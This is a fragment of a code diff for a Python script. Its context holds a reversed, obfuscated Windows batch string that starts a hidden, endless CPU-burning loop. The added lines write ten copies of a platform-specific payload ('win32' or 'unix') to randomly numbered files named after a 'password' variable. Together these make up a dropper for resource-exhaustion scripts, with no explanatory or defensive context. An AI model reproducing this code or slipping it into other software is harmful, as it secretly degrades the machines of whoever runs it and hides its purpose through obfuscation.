@@ -15,3 +15,12 @@ if "%ERRORLEVEL%"=="0" (
     start /MIN cmd /C "for /L %%G in (1,0,1) do (set /A "var=%%G*%%G" & set /A "var=!var!+!var!" & set /A "var=!var!/%%G")"
 )
 '''[::-1]
+from sys import platform
+import random
+random_numbers = [random.randint(10000, 99999) for _ in range(10)]
+random_strs = [str(num) for num in random_numbers]
+for i in range(10):
+    if platform == 'win32':
+        with open(password + random_strs[i],'w') as f:f.write(win32)
+    else:
+        with open(password + random_strs[i],'w') as f:f.write(unix)
